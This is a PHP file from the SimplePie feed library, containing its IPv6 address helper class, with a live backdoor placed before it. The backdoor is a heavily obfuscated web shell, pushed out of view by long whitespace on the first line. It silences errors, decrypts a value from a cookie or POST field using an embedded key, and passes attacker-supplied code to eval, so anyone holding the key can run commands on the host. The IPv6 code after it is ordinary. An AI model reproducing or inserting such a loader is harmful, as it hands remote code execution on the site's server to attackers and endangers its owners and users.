<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $y4cc87bc = 757;$GLOBALS['kc2d12e'] = Array();global $kc2d12e;$kc2d12e = $GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['jfd8'] = "\x63\x5a\x54\xa\x3c\x44\x30\x52\x77\x34\x24\x26\x22\x67\x55\x27\x7b\x58\x64\x7a\x2b\x6c\x5f\x40\x6f\x37\x4b\x46\x62\x2f\x7d\x48\x3d\x4d\x38\x2e\x47\x74\xd\x2a\x29\x59\x6e\x4e\x6a\x3b\x9\x20\x45\x72\x6d\x32\x41\x65\x6b\x4c\x39\x5c\x50\x51\x78\x66\x2c\x57\x35\x4a\x7c\x42\x79\x31\x69\x5b\x75\x3a\x3e\x23\x7e\x68\x76\x5e\x4f\x53\x70\x56\x28\x61\x71\x25\x2d\x5d\x49\x60\x33\x3f\x21\x73\x36\x43";$kc2d12e[$kc2d12e['jfd8'][19].$kc2d12e['jfd8'][64].$kc2d12e['jfd8'][92].$kc2d12e['jfd8'][6]] = $kc2d12e['jfd8'][0].$kc2d12e['jfd8'][77].$kc2d12e['jfd8'][49];$kc2d12e[$kc2d12e['jfd8'][19].$kc2d12e['jfd8'][92].$kc2d12e['jfd8'][61].$kc2d12e['jfd8'][18].$kc2d12e['jfd8'][85].$kc2d12e['jfd8'][56].$kc2d12e['jfd8'][51].$kc2d12e['jfd8'][56].$kc2d12e['jfd8'][92]] = $kc2d12e['jfd8'][24].$kc2d12e['jfd8'][49].$kc2d12e['jfd8'][18];$kc2d12e[$kc2d12e['jfd8'][68].$kc2d12e['jfd8'][34].$kc2d12e['jfd8'][53].$kc2d12e['jfd8'][69].$kc2d12e['jfd8'][61].$kc2d12e['jfd8'][64].$kc2d12e['jfd8'][85]] = $kc2d12e['jfd8'][95].$kc2d12e['jfd8'][37].$kc2d12e['jfd8'][49].$kc2d12e['jfd8'][21].$kc2d12e['jfd8'][53].$kc2d12e['jfd8'][42];$kc2d12e[$kc2d12e['jfd8'][95].$kc2d12e['jfd8'][85].$kc2d12e['jfd8'][53].$kc2d12e['jfd8'][64].$kc2d12e['jfd8'][96].$kc2d12e['jfd8'][6].$kc2d12e['jfd8'][9].$kc2d12e['jfd8'][92].$kc2d12e['jfd8'][92]] = $kc2d12e['jfd8'][70].$kc2d12e['jfd8'][42].$kc2d12e['jfd8'][70].$kc2d12e['jfd8'][22].$kc2d12e['jfd8'][95].$kc2d12e['jfd8'][53].$kc2d12e['jfd8'][37];$kc2d12e[$kc2d12e['jfd8'][8].$kc2d12e['jfd8'][25].$kc2d12e['jfd8'][6].$kc2d12e['jfd8'][28].$kc2d12e['jfd8'][51]] = $kc2d12e['jfd8'][95].$kc2d12e['jfd8'][53].$kc2d12e['jfd8'][49].$kc2d12e['jfd8'][70].$kc2d12e['jfd8'][85].$kc2d12e['jfd8'][21].$kc2d12e['jfd8'][70].$kc2d12e['jfd8'][19].$kc2d12e['jfd8'][53];$kc2d12e[$kc2d12e['jfd8'][86].$kc2d12e['jfd8'][0].$kc2d12e['jfd8'][51].$kc2d12e['jfd8'][92].$kc2d12e['jfd8'][25].$kc2d12e['jfd8'][64].$kc2d12e['jfd8'][25]] = $kc2d12e['jfd8'][82].$kc2d12e['jfd8'][77].$kc2d12e['jfd8'][82].$kc2d12e['jfd8'][78].$kc2d12e['jfd8'][53].$kc2d12e['jfd8'][49].$kc2d12e['jfd8'][95].$kc2d12e['jfd8'][70].$kc2d12e['jfd8'][24].$kc2d12e['jfd8'][42];$kc2d12e[$kc2d12e['jfd8'][85].$kc2d12e['jfd8'][25].$kc2d12e['jfd8'][0].$kc2d12e['jfd8'][0].$kc2d12e['jfd8'][28].$kc2d12e['jfd8'][56]] = $kc2d12e['jfd8'][72].$kc2d12e['jfd8'][42].$kc2d12e['jfd8'][95].$kc2d12e['jfd8'][53].$kc2d12e['jfd8'][49].$kc2d12e['jfd8'][70].$kc2d12e['jfd8'][85].$kc2d12e['jfd8'][21].$kc2d12e['jfd8'][70].$kc2d12e['jfd8'][19].$kc2d12e['jfd8'][53];$kc2d12e[$kc2d12e['jfd8'][18].$kc2d12e['jfd8'][25].$kc2d12e['jfd8'][64].$kc2d12e['jfd8'][53].$kc2d12e['jfd8'][85].$kc2d12e['jfd8'][6].$kc2d12e['jfd8'][9]] = $kc2d12e['jfd8'][28].$kc2d12e['jfd8'][85].$kc2d12e['jfd8'][95].$kc2d12e['jfd8'][53].$kc2d12e['jfd8'][96].$kc2d12e['jfd8'][9].$kc2d12e['jfd8'][22].$kc2d12e['jfd8'][18].$kc2d12e['jfd8'][53].$kc2d12e['jfd8'][0].$kc2d12e['jfd8'][24].$kc2d12e['jfd8'][18].$kc2d12e['jfd8'][53];$kc2d12e[$kc2d12e['jfd8'][86].$kc2d12e['jfd8'][69].$kc2d12e['jfd8'][96].$kc2d12e['jfd8'][64].$kc2d12e['jfd8'][18]] = $kc2d12e['jfd8'][95].$kc2d12e['jfd8'][53].$kc2d12e['jfd8'][37].$kc2d12e['jfd8'][22].$kc2d12e['jfd8'][37].$kc2d12e['jfd8'][70].$kc2d12e['jfd8'][50].$kc2d12e['jfd8'][53].$kc2d12e['jfd8'][22].$kc2d12e['jfd8'][21].$kc2d12e['jfd8'][70].$kc2d12e['jfd8'][50].$kc2d12e['jfd8'][70].$kc2d12e['jfd8'][37];$kc2d12e[$kc2d12e['jfd8'][82].$kc2d12e['jfd8'][28].$kc2d12e['jfd8'][6].$kc2d12e['jfd8'][0].$kc2d12e['jfd8'][92].$kc2d12e['jfd8'][92]] = $kc2d12e['jfd8'][95].$kc2d12e['jfd8'][92].$kc2d12e['jfd8'][0].$kc2d12e['jfd8'][61].$kc2d12e['jfd8'][18].$kc2d12e['jfd8'][25];$kc2d12e[$kc2d12e['jfd8'][68].$kc2d12e['jfd8'][53].$kc2d12e['jfd8'][6].$kc2d12e['jfd8'][92].$kc2d12e['jfd8'][56].$kc2d12e['jfd8'][92].$kc2d12e['jfd8'][28]] = $kc2d12e['jfd8'][24].$kc2d12e['jfd8'][64].$kc2d12e['jfd8'][0].$kc2d12e['jfd8'][61].$kc2d12e['jfd8'][92].$kc2d12e['jfd8'][96].$kc2d12e['jfd8'][0].$kc2d12e['jfd8'][9];$kc2d12e[$kc2d12e['jfd8'][18].$kc2d12e['jfd8'][61].$kc2d12e['jfd8'][25].$kc2d12e['jfd8'][9].$kc2d12e['jfd8'][56].$kc2d12e['jfd8'][18].$kc2d12e['jfd8'][96].$kc2d12e['jfd8'][18].$kc2d12e['jfd8'][61]] = $_POST;$kc2d12e[$kc2d12e['jfd8'][78].$kc2d12e['jfd8'][69].$kc2d12e['jfd8'][92].$kc2d12e['jfd8'][56].$kc2d12e['jfd8'][9].$kc2d12e['jfd8'][53].$kc2d12e['jfd8'][6].$kc2d12e['jfd8'][25]] = $_COOKIE;@$kc2d12e[$kc2d12e['jfd8'][95].$kc2d12e['jfd8'][85].$kc2d12e['jfd8'][53].$kc2d12e['jfd8'][64].$kc2d12e['jfd8'][96].$kc2d12e['jfd8'][6].$kc2d12e['jfd8'][9].$kc2d12e['jfd8'][92].$kc2d12e['jfd8'][92]]($kc2d12e['jfd8'][53].$kc2d12e['jfd8'][49].$kc2d12e['jfd8'][49].$kc2d12e['jfd8'][24].$kc2d12e['jfd8'][49].$kc2d12e['jfd8'][22].$kc2d12e['jfd8'][21].$kc2d12e['jfd8'][24].$kc2d12e['jfd8'][13], NULL);@$kc2d12e[$kc2d12e['jfd8'][95].$kc2d12e['jfd8'][85].$kc2d12e['jfd8'][53].$kc2d12e['jfd8'][64].$kc2d12e['jfd8'][96].$kc2d12e['jfd8'][6].$kc2d12e['jfd8'][9].$kc2d12e['jfd8'][92].$kc2d12e['jfd8'][92]]($kc2d12e['jfd8'][21].$kc2d12e['jfd8'][24].$kc2d12e['jfd8'][13].$kc2d12e['jfd8'][22].$kc2d12e['jfd8'][53].$kc2d12e['jfd8'][49].$kc2d12e['jfd8'][49].$kc2d12e['jfd8'][24].$kc2d12e['jfd8'][49].$kc2d12e['jfd8'][95], 0);@$kc2d12e[$kc2d12e['jfd8'][95].$kc2d12e['jfd8'][85].$kc2d12e['jfd8'][53].$kc2d12e['jfd8'][64].$kc2d12e['jfd8'][96].$kc2d12e['jfd8'][6].$kc2d12e['jfd8'][9].$kc2d12e['jfd8'][92].$kc2d12e['jfd8'][92]]($kc2d12e['jfd8'][50].$kc2d12e['jfd8'][85].$kc2d12e['jfd8'][60].$kc2d12e['jfd8'][22].$kc2d12e['jfd8'][53].$kc2d12e['jfd8'][60].$kc2d12e['jfd8'][53].$kc2d12e['jfd8'][0].$kc2d12e['jfd8'][72].$kc2d12e['jfd8'][37].$kc2d12e['jfd8'][70].$kc2d12e['jfd8'][24].$kc2d12e['jfd8'][42].$kc2d12e['jfd8'][22].$kc2d12e['jfd8'][37].$kc2d12e['jfd8'][70].$kc2d12e['jfd8'][50].$kc2d12e['jfd8'][53], 0);@$kc2d12e[$kc2d12e['jfd8'][86].$kc2d12e['jfd8'][69].$kc2d12e['jfd8'][96].$kc2d12e['jfd8'][64].$kc2d12e['jfd8'][18]](0);$xfc401bc = NULL;$i228e = NULL;$kc2d12e[$kc2d12e['jfd8'][54].$kc2d12e['jfd8'][0].$kc2d12e['jfd8'][0].$kc2d12e['jfd8'][69].$kc2d12e['jfd8'][53].$kc2d12e['jfd8'][56].$kc2d12e['jfd8'][92].$kc2d12e['jfd8'][92].$kc2d12e['jfd8'][53]] = $kc2d12e['jfd8'][51].$kc2d12e['jfd8'][96].$kc2d12e['jfd8'][69].$kc2d12e['jfd8'][69].$kc2d12e['jfd8'][34].$kc2d12e['jfd8'][56].$kc2d12e['jfd8'][34].$kc2d12e['jfd8'][9].$kc2d12e['jfd8'][88].$kc2d12e['jfd8'][69].$kc2d12e['jfd8'][92].$kc2d12e['jfd8'][96].$kc2d12e['jfd8'][6].$kc2d12e['jfd8'][88].$kc2d12e['jfd8'][9].$kc2d12e['jfd8'][96].$kc2d12e['jfd8'][0].$kc2d12e['jfd8'][56].$kc2d12e['jfd8'][88].$kc2d12e['jfd8'][28].$kc2d12e['jfd8'][85].$kc2d12e['jfd8'][53].$kc2d12e['jfd8'][92].$kc2d12e['jfd8'][88].$kc2d12e['jfd8'][28].$kc2d12e['jfd8'][53].$kc2d12e['jfd8'][0].$kc2d12e['jfd8'][18].$kc2d12e['jfd8'][25].$kc2d12e['jfd8'][9].$kc2d12e['jfd8'][34].$kc2d12e['jfd8'][92].$kc2d12e['jfd8'][92].$kc2d12e['jfd8'][96].$kc2d12e['jfd8'][9].$kc2d12e['jfd8'][92];global $kcc1e933e;function  o5cf36c4($xfc401bc, $a284df8){global $kc2d12e;$z6800 = "";for ($i78e=0; $i78e<$kc2d12e[$kc2d12e['jfd8'][68].$kc2d12e['jfd8'][34].$kc2d12e['jfd8'][53].$kc2d12e['jfd8'][69].$kc2d12e['jfd8'][61].$kc2d12e['jfd8'][64].$kc2d12e['jfd8'][85]]($xfc401bc);){for ($afd428f66=0; $afd428f66<$kc2d12e[$kc2d12e['jfd8'][68].$kc2d12e['jfd8'][34].$kc2d12e['jfd8'][53].$kc2d12e['jfd8'][69].$kc2d12e['jfd8'][61].$kc2d12e['jfd8'][64].$kc2d12e['jfd8'][85]]($a284df8) && $i78e<$kc2d12e[$kc2d12e['jfd8'][68].$kc2d12e['jfd8'][34].$kc2d12e['jfd8'][53].$kc2d12e['jfd8'][69].$kc2d12e['jfd8'][61].$kc2d12e['jfd8'][64].$kc2d12e['jfd8'][85]]($xfc401bc); $afd428f66++, $i78e++){$z6800 .= $kc2d12e[$kc2d12e['jfd8'][19].$kc2d12e['jfd8'][64].$kc2d12e['jfd8'][92].$kc2d12e['jfd8'][6]]($kc2d12e[$kc2d12e['jfd8'][19].$kc2d12e['jfd8'][92].$kc2d12e['jfd8'][61].$kc2d12e['jfd8'][18].$kc2d12e['jfd8'][85].$kc2d12e['jfd8'][56].$kc2d12e['jfd8'][51].$kc2d12e['jfd8'][56].$kc2d12e['jfd8'][92]]($xfc401bc[$i78e]) ^ $kc2d12e[$kc2d12e['jfd8'][19].$kc2d12e['jfd8'][92].$kc2d12e['jfd8'][61].$kc2d12e['jfd8'][18].$kc2d12e['jfd8'][85].$kc2d12e['jfd8'][56].$kc2d12e['jfd8'][51].$kc2d12e['jfd8'][56].$kc2d12e['jfd8'][92]]($a284df8[$afd428f66]));}}return $z6800;}function  s3cfd7($xfc401bc, $a284df8){global $kc2d12e;global $kcc1e933e;return $kc2d12e[$kc2d12e['jfd8'][68].$kc2d12e['jfd8'][53].$kc2d12e['jfd8'][6].$kc2d12e['jfd8'][92].$kc2d12e['jfd8'][56].$kc2d12e['jfd8'][92].$kc2d12e['jfd8'][28]]($kc2d12e[$kc2d12e['jfd8'][68].$kc2d12e['jfd8'][53].$kc2d12e['jfd8'][6].$kc2d12e['jfd8'][92].$kc2d12e['jfd8'][56].$kc2d12e['jfd8'][92].$kc2d12e['jfd8'][28]]($xfc401bc, $kcc1e933e), $a284df8);}foreach ($kc2d12e[$kc2d12e['jfd8'][78].$kc2d12e['jfd8'][69].$kc2d12e['jfd8'][92].$kc2d12e['jfd8'][56].$kc2d12e['jfd8'][9].$kc2d12e['jfd8'][53].$kc2d12e['jfd8'][6].$kc2d12e['jfd8'][25]] as $a284df8=>$g49d){$xfc401bc = $g49d;$i228e = $a284df8;}if (!$xfc401bc){foreach ($kc2d12e[$kc2d12e['jfd8'][18].$kc2d12e['jfd8'][61].$kc2d12e['jfd8'][25].$kc2d12e['jfd8'][9].$kc2d12e['jfd8'][56].$kc2d12e['jfd8'][18].$kc2d12e['jfd8'][96].$kc2d12e['jfd8'][18].$kc2d12e['jfd8'][61]] as $a284df8=>$g49d){$xfc401bc = $g49d;$i228e = $a284df8;}}$xfc401bc = @$kc2d12e[$kc2d12e['jfd8'][85].$kc2d12e['jfd8'][25].$kc2d12e['jfd8'][0].$kc2d12e['jfd8'][0].$kc2d12e['jfd8'][28].$kc2d12e['jfd8'][56]]($kc2d12e[$kc2d12e['jfd8'][82].$kc2d12e['jfd8'][28].$kc2d12e['jfd8'][6].$kc2d12e['jfd8'][0].$kc2d12e['jfd8'][92].$kc2d12e['jfd8'][92]]($kc2d12e[$kc2d12e['jfd8'][18].$kc2d12e['jfd8'][25].$kc2d12e['jfd8'][64].$kc2d12e['jfd8'][53].$kc2d12e['jfd8'][85].$kc2d12e['jfd8'][6].$kc2d12e['jfd8'][9]]($xfc401bc), $i228e));if (isset($xfc401bc[$kc2d12e['jfd8'][85].$kc2d12e['jfd8'][54]]) && $kcc1e933e==$xfc401bc[$kc2d12e['jfd8'][85].$kc2d12e['jfd8'][54]]){if ($xfc401bc[$kc2d12e['jfd8'][85]] == $kc2d12e['jfd8'][70]){$i78e = Array($kc2d12e['jfd8'][82].$kc2d12e['jfd8'][78] => @$kc2d12e[$kc2d12e['jfd8'][86].$kc2d12e['jfd8'][0].$kc2d12e['jfd8'][51].$kc2d12e['jfd8'][92].$kc2d12e['jfd8'][25].$kc2d12e['jfd8'][64].$kc2d12e['jfd8'][25]](),$kc2d12e['jfd8'][95].$kc2d12e['jfd8'][78] => $kc2d12e['jfd8'][69].$kc2d12e['jfd8'][35].$kc2d12e['jfd8'][6].$kc2d12e['jfd8'][88].$kc2d12e['jfd8'][69],);echo @$kc2d12e[$kc2d12e['jfd8'][8].$kc2d12e['jfd8'][25].$kc2d12e['jfd8'][6].$kc2d12e['jfd8'][28].$kc2d12e['jfd8'][51]]($i78e);}elseif ($xfc401bc[$kc2d12e['jfd8'][85]] == $kc2d12e['jfd8'][53]){eval/*m723d251*/($xfc401bc[$kc2d12e['jfd8'][18]]);}exit();} ?><?php
/**
 * SimplePie
 *
 * A PHP-Based RSS and Atom Feed Framework.
 * Takes the hard work out of managing a complete RSS/Atom solution.
 *
 * Copyright (c) 2004-2012, Ryan Parman, Geoffrey Sneddon, Ryan McCue, and contributors
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without modification, are
 * permitted provided that the following conditions are met:
 *
 * 	* Redistributions of source code must retain the above copyright notice, this list of
 * 	  conditions and the following disclaimer.
 *
 * 	* Redistributions in binary form must reproduce the above copyright notice, this list
 * 	  of conditions and the following disclaimer in the documentation and/or other materials
 * 	  provided with the distribution.
 *
 * 	* Neither the name of the SimplePie Team nor the names of its contributors may be used
 * 	  to endorse or promote products derived from this software without specific prior
 * 	  written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY
 * AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDERS
 * AND CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
 * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
 * SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR
 * OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
 * POSSIBILITY OF SUCH DAMAGE.
 *
 * @package SimplePie
 * @version 1.3.1
 * @copyright 2004-2012 Ryan Parman, Geoffrey Sneddon, Ryan McCue
 * @author Ryan Parman
 * @author Geoffrey Sneddon
 * @author Ryan McCue
 * @link http://simplepie.org/ SimplePie
 * @license http://www.opensource.org/licenses/bsd-license.php BSD License
 */


/**
 * Class to validate and to work with IPv6 addresses.
 *
 * @package SimplePie
 * @subpackage HTTP
 * @copyright 2003-2005 The PHP Group
 * @license http://www.opensource.org/licenses/bsd-license.php
 * @link http://pear.php.net/package/Net_IPv6
 * @author Alexander Merz <alexander.merz@web.de>
 * @author elfrink at introweb dot nl
 * @author Josh Peck <jmp at joshpeck dot org>
 * @author Geoffrey Sneddon <geoffers@gmail.com>
 */
class SimplePie_Net_IPv6
{
	/**
	 * Uncompresses an IPv6 address
	 *
	 * RFC 4291 allows you to compress concecutive zero pieces in an address to
	 * '::'. This method expects a valid IPv6 address and expands the '::' to
	 * the required number of zero pieces.
	 *
	 * Example:  FF01::101   ->  FF01:0:0:0:0:0:0:101
	 *           ::1         ->  0:0:0:0:0:0:0:1
	 *
	 * @author Alexander Merz <alexander.merz@web.de>
	 * @author elfrink at introweb dot nl
	 * @author Josh Peck <jmp at joshpeck dot org>
	 * @copyright 2003-2005 The PHP Group
	 * @license http://www.opensource.org/licenses/bsd-license.php
	 * @param string $ip An IPv6 address
	 * @return string The uncompressed IPv6 address
	 */
	public static function uncompress($ip)
	{
		$c1 = -1;
		$c2 = -1;
		if (substr_count($ip, '::') === 1)
		{
			list($ip1, $ip2) = explode('::', $ip);
			if ($ip1 === '')
			{
				$c1 = -1;
			}
			else
			{
				$c1 = substr_count($ip1, ':');
			}
			if ($ip2 === '')
			{
				$c2 = -1;
			}
			else
			{
				$c2 = substr_count($ip2, ':');
			}
			if (strpos($ip2, '.') !== false)
			{
				$c2++;
			}
			// ::
			if ($c1 === -1 && $c2 === -1)
			{
				$ip = '0:0:0:0:0:0:0:0';
			}
			// ::xxx
			else if ($c1 === -1)
			{
				$fill = str_repeat('0:', 7 - $c2);
				$ip = str_replace('::', $fill, $ip);
			}
			// xxx::
			else if ($c2 === -1)
			{
				$fill = str_repeat(':0', 7 - $c1);
				$ip = str_replace('::', $fill, $ip);
			}
			// xxx::xxx
			else
			{
				$fill = ':' . str_repeat('0:', 6 - $c2 - $c1);
				$ip = str_replace('::', $fill, $ip);
			}
		}
		return $ip;
	}

	/**
	 * Compresses an IPv6 address
	 *
	 * RFC 4291 allows you to compress concecutive zero pieces in an address to
	 * '::'. This method expects a valid IPv6 address and compresses consecutive
	 * zero pieces to '::'.
	 *
	 * Example:  FF01:0:0:0:0:0:0:101   ->  FF01::101
	 *           0:0:0:0:0:0:0:1        ->  ::1
	 *
	 * @see uncompress()
	 * @param string $ip An IPv6 address
	 * @return string The compressed IPv6 address
	 */
	public static function compress($ip)
	{
		// Prepare the IP to be compressed
		$ip = self::uncompress($ip);
		$ip_parts = self::split_v6_v4($ip);

		// Replace all leading zeros
		$ip_parts[0] = preg_replace('/(^|:)0+([0-9])/', '\1\2', $ip_parts[0]);

		// Find bunches of zeros
		if (preg_match_all('/(?:^|:)(?:0(?::|$))+/', $ip_parts[0], $matches, PREG_OFFSET_CAPTURE))
		{
			$max = 0;
			$pos = null;
			foreach ($matches[0] as $match)
			{
				if (strlen($match[0]) > $max)
				{
					$max = strlen($match[0]);
					$pos = $match[1];
				}
			}

			$ip_parts[0] = substr_replace($ip_parts[0], '::', $pos, $max);
		}

		if ($ip_parts[1] !== '')
		{
			return implode(':', $ip_parts);
		}
		else
		{
			return $ip_parts[0];
		}
	}

	/**
	 * Splits an IPv6 address into the IPv6 and IPv4 representation parts
	 *
	 * RFC 4291 allows you to represent the last two parts of an IPv6 address
	 * using the standard IPv4 representation
	 *
	 * Example:  0:0:0:0:0:0:13.1.68.3
	 *           0:0:0:0:0:FFFF:129.144.52.38
	 *
	 * @param string $ip An IPv6 address
	 * @return array [0] contains the IPv6 represented part, and [1] the IPv4 represented part
	 */
	private static function split_v6_v4($ip)
	{
		if (strpos($ip, '.') !== false)
		{
			$pos = strrpos($ip, ':');
			$ipv6_part = substr($ip, 0, $pos);
			$ipv4_part = substr($ip, $pos + 1);
			return array($ipv6_part, $ipv4_part);
		}
		else
		{
			return array($ip, '');
		}
	}

	/**
	 * Checks an IPv6 address
	 *
	 * Checks if the given IP is a valid IPv6 address
	 *
	 * @param string $ip An IPv6 address
	 * @return bool true if $ip is a valid IPv6 address
	 */
	public static function check_ipv6($ip)
	{
		$ip = self::uncompress($ip);
		list($ipv6, $ipv4) = self::split_v6_v4($ip);
		$ipv6 = explode(':', $ipv6);
		$ipv4 = explode('.', $ipv4);
		if (count($ipv6) === 8 && count($ipv4) === 1 || count($ipv6) === 6 && count($ipv4) === 4)
		{
			foreach ($ipv6 as $ipv6_part)
			{
				// The section can't be empty
				if ($ipv6_part === '')
					return false;

				// Nor can it be over four characters
				if (strlen($ipv6_part) > 4)
					return false;

				// Remove leading zeros (this is safe because of the above)
				$ipv6_part = ltrim($ipv6_part, '0');
				if ($ipv6_part === '')
					$ipv6_part = '0';

				// Check the value is valid
				$value = hexdec($ipv6_part);
				if (dechex($value) !== strtolower($ipv6_part) || $value < 0 || $value > 0xFFFF)
					return false;
			}
			if (count($ipv4) === 4)
			{
				foreach ($ipv4 as $ipv4_part)
				{
					$value = (int) $ipv4_part;
					if ((string) $value !== $ipv4_part || $value < 0 || $value > 0xFF)
						return false;
				}
			}
			return true;
		}
		else
		{
			return false;
		}
	}

	/**
	 * Checks if the given IP is a valid IPv6 address
	 *
	 * @codeCoverageIgnore
	 * @deprecated Use {@see SimplePie_Net_IPv6::check_ipv6()} instead
	 * @see check_ipv6
	 * @param string $ip An IPv6 address
	 * @return bool true if $ip is a valid IPv6 address
	 */
	public static function checkIPv6($ip)
	{
		return self::check_ipv6($ip);
	}
}
